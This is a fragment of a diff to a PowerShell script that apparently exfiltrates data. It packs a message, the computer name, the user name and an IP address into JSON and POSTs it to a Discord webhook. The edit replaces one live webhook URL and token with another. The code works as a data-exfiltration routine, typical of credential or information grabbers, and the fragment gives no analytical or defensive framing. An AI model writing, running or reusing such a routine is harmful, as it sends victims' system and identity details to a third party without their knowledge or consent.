@@ -136,7 +136,7 @@ ip: "$ip"}
                 content = $message
                 username = "$env:COMPUTERNAME | $env:USERNAME"
             } | ConvertTo-Json -Compress
-            Invoke-WebRequest -Uri "https://discord.com/api/webhooks/1396196434646138941/vOksU__xaH72S3cCcxcauq6A45Yn_d7l-Qcvq6-oWachUkMXZDrku17Oeja4miiyFSNM" -Method Post -Body $payload -ContentType 'application/json'
+            Invoke-WebRequest -Uri "https://discord.com/api/webhooks/1426167382082060329/SVRJiBFesT48IILlWvBaHPtZWnS3nOuGGp9VggODPoBvt6QsVGfoEITcCWK7_FGWxr3q" -Method Post -Body $payload -ContentType 'application/json'
 
         } catch {
             continue
